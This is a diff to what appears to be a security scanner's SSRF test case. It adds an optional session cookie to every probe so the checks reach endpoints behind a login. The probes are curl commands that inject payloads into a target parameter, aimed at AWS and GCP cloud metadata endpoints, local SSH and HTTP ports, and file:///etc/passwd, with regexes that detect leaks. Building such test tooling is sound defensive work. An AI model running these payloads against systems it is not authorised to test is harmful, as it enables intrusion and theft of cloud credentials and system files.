@@ -11,13 +11,18 @@ references:
 # auto-discover these — that's recon's job.
 target_schema:
   required: [url, parameter]
-  optional: [collaborator_host]
+  # `cookie` is what lets this reach an endpoint behind a login. Every probe
+  # sends it. Without it the case fetched a 302 to the login form, matched none
+  # of its evidence patterns, and reported CLEAN on a page it never reached —
+  # the same false negative INPV-05 had. An SSRF sink is very often behind
+  # auth, so this is the normal case, not an edge one.
+  optional: [collaborator_host, cookie]
 
 steps:
   - name: cloud_metadata_aws
     tool: curl
     command: >-
-      curl -s "{{url}}?{{parameter}}=http://169.254.169.254/latest/meta-data/"
+      curl -s -b "{{cookie}}" "{{url}}?{{parameter}}=http://169.254.169.254/latest/meta-data/"
     evaluators:
       - type: regex
         pattern: 'ami-id|instance-id|iam/|placement/|hostname$|local-hostname'
@@ -29,7 +34,7 @@ steps:
     tool: curl
     when: no_finding_yet
     command: >-
-      curl -s -H "Metadata-Flavor: Google" "{{url}}?{{parameter}}=http://metadata.google.internal/computeMetadata/v1/"
+      curl -s -b "{{cookie}}" -H "Metadata-Flavor: Google" "{{url}}?{{parameter}}=http://metadata.google.internal/computeMetadata/v1/"
     evaluators:
       - type: regex
         pattern: 'instance/|project/|service-accounts/'
@@ -41,7 +46,7 @@ steps:
     tool: curl
     when: no_finding_yet
     command: >-
-      curl -s "{{url}}?{{parameter}}=http://127.0.0.1:22"
+      curl -s -b "{{cookie}}" "{{url}}?{{parameter}}=http://127.0.0.1:22"
     evaluators:
       - type: regex
         pattern: 'SSH-\d|OpenSSH'
@@ -53,7 +58,7 @@ steps:
     tool: curl
     when: no_finding_yet
     command: >-
-      curl -s "{{url}}?{{parameter}}=file:///etc/passwd"
+      curl -s -b "{{cookie}}" "{{url}}?{{parameter}}=file:///etc/passwd"
     evaluators:
       - type: regex
         pattern: 'root:.*:0:0:|/bin/(bash|sh)'
@@ -65,7 +70,7 @@ steps:
     tool: curl
     when: no_finding_yet
     command: >-
-      curl -s "{{url}}?{{parameter}}=http://localhost:80"
+      curl -s -b "{{cookie}}" "{{url}}?{{parameter}}=http://localhost:80"
     evaluators:
       - type: llm
         instruction: >-
